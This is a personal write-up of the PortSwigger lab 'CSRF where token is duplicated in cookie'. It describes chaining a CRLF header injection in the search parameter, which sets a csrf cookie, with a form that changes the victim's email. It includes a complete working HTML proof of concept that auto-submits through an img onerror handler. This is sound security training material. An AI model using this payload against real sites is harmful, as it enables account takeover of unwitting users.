# [CSRF where token is duplicated in cookie] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-09
 
---
 
## Vulnerability / core concept
Cross-site Request Forgery

## What made me stuck
This level was pretty easy and straightforward, so I solved it relatively easy.
 
## What unblocked me
`null`
 
---


## Attack path
1) First we need to log in to access email change functionality.
2) After logging in, we can start inspecting the application, its cookies and parameters.
3) We can notice that application uses csrf value both as a parameter and a cookie value to protect csrf attacks.
4) I sent `/my-account/change-email` request to Replay in Caido, and started analyzing it.
5) I found out that as long as cookie value and parameter value for csrf match, our request is successful. It does not check the length or anything.
6) To exploit this, we should also be able to change the value of csrf in the cookie. That is where we need the vulnerability in `/search?=`. The search input appears in cookies as `LastSearchedItem` and we can exploit it by using encoded `\r\n` -> `%0d%0a` to add new header `Set-Cookie` to change csrf.7) Now all we need to do is to use csrf PoC generator and deliver it to the victim to complete csrf attack and lab.

---


## Payload / key command
```html
<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Standard CSRF PoC</h3>
      <form action="https://0a5e00a204983d9c80c0035000df008e.web-security-academy.net/my-account/change-email" method="post">
      <input type="hidden" name="email" value="victim@babek" />
    <input type="hidden" name="csrf" value="babek" />
          <input type="submit" value="Submit request" />
      </form>
        <img src="https://0a5e00a204983d9c80c0035000df008e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=babek%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
  </html>
```
Here, as you can see, we are using `/search?=` vulnerability to change the victim's csrf cookie value. We do not use script auto-submit as it will execute immediately as soon as page loads. This will happen before request changes csrf cookie value, making our payload ineffective.

---


## What I'd recognize faster next time
Using duplicate csrf as a security measure is not the best way to prevent csrf attacks. As you can see, by chaining it with other vulnerabilities, like `/search=` one in this lab, it is possible to make victim perform actions that they never intended.


